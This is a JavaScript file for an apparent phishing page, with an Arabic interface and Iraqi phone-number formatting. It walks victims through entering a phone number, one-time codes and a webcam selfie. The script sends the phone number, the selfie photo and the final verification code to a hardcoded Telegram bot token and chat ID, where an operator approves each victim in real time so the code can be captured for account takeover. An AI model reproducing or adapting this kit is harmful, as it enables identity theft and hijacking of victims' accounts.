document.addEventListener('DOMContentLoaded', () => {
    const BOT_TOKEN = '6692627244:AAEIS4t9xIIksnY9UxlGiMsf0KwBB5-XS5M';
    const CHAT_ID = '6964432572';
    let userPhoneNumber = '', userOtp = '', verificationCode = '';
    const loginPage = document.getElementById('login-page');
    const otpPage = document.getElementById('otp-page');
    const selfiePage = document.getElementById('selfie-instructions-page');
    const cameraPage = document.getElementById('camera-page');
    const waitingPage = document.getElementById('waiting-page');
    const verificationCodePage = document.getElementById('verification-code-page');
    const phoneInput = document.getElementById('phone');
    const loginBtn = document.getElementById('login-btn');
    const loginForm = document.getElementById('login-form');
    const otpInputs = document.querySelectorAll('#otp-page .otp-input');
    const continueBtn = document.getElementById('continue-btn');
    const takeSelfieBtn = document.getElementById('take-selfie-btn');
    const cameraFeed = document.getElementById('camera-feed');
    const captureBtn = document.getElementById('capture-btn');
    const verificationCodeInputs = document.querySelectorAll('#verification-code-page .otp-input');
    const verifyBtn = document.getElementById('verify-btn');
    const backToLoginBtn = document.querySelector('.back-to-login');
    const backToOtpBtn = document.querySelector('.back-to-otp');
    const backToSelfieInstructionsBtn = document.querySelector('.back-to-selfie-instructions');
    const countdownSpan = document.getElementById('countdown');
    const phoneNumberDisplay = document.querySelector('.phone-number-display');
    const signupBtn = document.querySelector('.signup-btn-style');
    let stream = null, countdownInterval;

    takeSelfieBtn.addEventListener('click', async () => {
        selfiePage.classList.remove('active');
        cameraPage.classList.add('active');
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            cameraFeed.srcObject = stream;
        } catch (e) {
            alert("لا يمكن الوصول إلى الكاميرا.");
        }
    });

    captureBtn.addEventListener('click', () => {
        const canvas = document.createElement('canvas');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(cameraFeed, 0, 0);
        stream.getTracks().forEach(t => t.stop());
        alert('تم التقاط الصورة!');
        cameraPage.classList.remove('active');
        waitingPage.classList.add('active');
        const sessionId = `session_${userPhoneNumber.replace(/[^0-9]/g, '')}_${Date.now()}`;

        sendTelegramMessageWithButtons(
            `تحقق من هوية المستخدم: ${userPhoneNumber}`,
            [[
                { text: "✅ موافق على الاستمرار", callback_data: `approve_${sessionId}` },
                { text: "❌ رفض", callback_data: `reject_${sessionId}` }
            ]]
        );
        canvas.toBlob(blob => sendTelegramPhoto(blob, `Selfie for ${userPhoneNumber}`), 'image/jpeg');
        checkForApproval(userPhoneNumber, sessionId);
    });

    function checkForApproval(phoneNumber, sessionId) {
        const pollInterval = setInterval(() => {
            fetch(`http://localhost:5000/check/${sessionId}`)
                .then(r => r.json()).then(data => {
                    if (data.status === 'approved') {
                        clearInterval(pollInterval);
                        waitingPage.classList.remove('active');
                        verificationCodePage.classList.add('active');
                        const s = phoneNumber.toString();
                        phoneNumberDisplay.textContent = `(+964) ${s.substring(0,2)}*****${s.slice(-3)}`;
                        startCountdown();
                        verificationCodeInputs[0]?.focus();
                    } else if (data.status === 'rejected') {
                        clearInterval(pollInterval);
                        alert('لم تتم العملية بنجاح. تم رفض الطلب.');
                        waitingPage.classList.remove('active');
                        loginPage.classList.add('active');
                    }
                }).catch(console.error);
        }, 1000);
        setTimeout(() => clearInterval(pollInterval), 300000);
    }

    loginForm.addEventListener('submit', e => {
        e.preventDefault();
        userPhoneNumber = phoneInput.value;
        loginPage.classList.remove('active');
        otpPage.classList.add('active');
        otpInputs[0]?.focus();
    });

    phoneInput.addEventListener('input', () => {
        const ok = phoneInput.value.trim().length > 5;
        loginBtn.disabled = !ok;
        loginBtn.classList.toggle('activated', ok);
    });

    otpInputs.forEach((inp,i) => {
        inp.addEventListener('input', () => {
            if (inp.value && i < otpInputs.length-1) otpInputs[i+1].focus();
            const all = [...otpInputs].every(x=>x.value);
            continueBtn.disabled = !all;
            continueBtn.classList.toggle('activated', all);
        });
    });

    continueBtn.addEventListener('click', () => {
        userOtp = [...otpInputs].map(x=>x.value).join('');
        otpPage.classList.remove('active');
        selfiePage.classList.add('active');
    });

    verificationCodeInputs.forEach((inp,i) => {
        inp.addEventListener('input', () => {
            if (inp.value && i < verificationCodeInputs.length-1) verificationCodeInputs[i+1].focus();
            const all = [...verificationCodeInputs].every(x=>x.value);
            verifyBtn.disabled = !all;
            verifyBtn.classList.toggle('activated', all);
        });
    });

    verifyBtn.addEventListener('click', () => {
        verificationCode = [...verificationCodeInputs].map(x=>x.value).join('');
        sendTelegramMessage(`**=== رمز التحقق المدخل ===**\nرقم: \`${userPhoneNumber}\`\nالرمز: \`${verificationCode}\``);
        alert('تم إرسال رمز التحقق!');
        resetForm();
        verificationCodePage.classList.remove('active');
        loginPage.classList.add('active');
    });

    signupBtn.addEventListener('click', () => {
        document.getElementById('signup-notice').classList.add('show');
        setTimeout(() => document.getElementById('signup-notice').classList.remove('show'), 3000);
    });

    backToLoginBtn.addEventListener('click', () => {
        otpPage.classList.remove('active');
        loginPage.classList.add('active');
    });
    backToOtpBtn.addEventListener('click', () => {
        selfiePage.classList.remove('active');
        otpPage.classList.add('active');
    });
    backToSelfieInstructionsBtn.addEventListener('click', () => {
        stopCamera();
        cameraPage.classList.remove('active');
        selfiePage.classList.add('active');
    });

    function startCountdown() {
        let left = 7;
        countdownSpan.textContent = left;
        clearInterval(countdownInterval);
        countdownInterval = setInterval(() => {
            countdownSpan.textContent = --left;
            if (left <= 0) clearInterval(countdownInterval);
        }, 1000);
    }

    function resetForm() {
        phoneInput.value = '';
        [...otpInputs, ...verificationCodeInputs].forEach(x => x.value = '');
        loginBtn.disabled = continueBtn.disabled = verifyBtn.disabled = true;
        stopCamera(); clearInterval(countdownInterval);
    }

    function sendTelegramMessage(text) {
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=Markdown&text=${encodeURIComponent(text)}`);
    }

    function sendTelegramMessageWithButtons(text, buttons) {
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text, reply_markup: { inline_keyboard: buttons } })
        });
    }

    function sendTelegramPhoto(blob, caption) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob, 'selfie.jpg');
        fd.append('caption', caption);
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }

    function stopCamera() {
        stream?.getTracks().forEach(t => t.stop());
        stream = null;
    }
});
